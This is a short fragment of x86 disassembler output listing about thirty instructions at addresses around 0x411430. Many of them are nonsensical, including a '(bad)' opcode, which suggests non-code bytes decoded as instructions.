  411429:	test   DWORD PTR [ebx-0x45f7db8b],ecx
  41142f:	dec    DWORD PTR [eax]
  411431:	and    al,0x7
  411433:	(bad)  
  411434:	cli    
  411435:	and    al,0x9b
  411437:	or     BYTE PTR [edx],dh
  411439:	sbb    BYTE PTR [ebx],al
  41143b:	adc    al,0x89
  41143d:	jmp    DWORD PTR [esp]
  411440:	mov    ecx,DWORD PTR [ebx+0x1c7c0c0c]
  411446:	adc    al,0x8
  411448:	dec    ebp
  411449:	adc    BYTE PTR [ebp-0x7c],dh
  41144c:	mov    esi,DWORD PTR [edx]
  41144e:	and    al,0x24
  411450:	xor    eax,DWORD PTR [ebp-0x63dbf175]
  411456:	add    edi,eax
  411458:	pcmpeqb mm1,mm2
  41145b:	jmp    0x4114a9
  41145d:	dec    DWORD PTR [eax]
  41145f:	je     0x41144c
  411461:	mov    edi,DWORD PTR [ecx]
  411463:	pop    ebp
  411464:	adc    BYTE PTR [esp+ecx*2-0x3e],al
  411468:	fwait
  411469:	mov    DWORD PTR [eax-0x8],ebp
  41146c:	jge    0x4114d6
  41146e:	dec    DWORD PTR [ecx+0x5fbf7424]
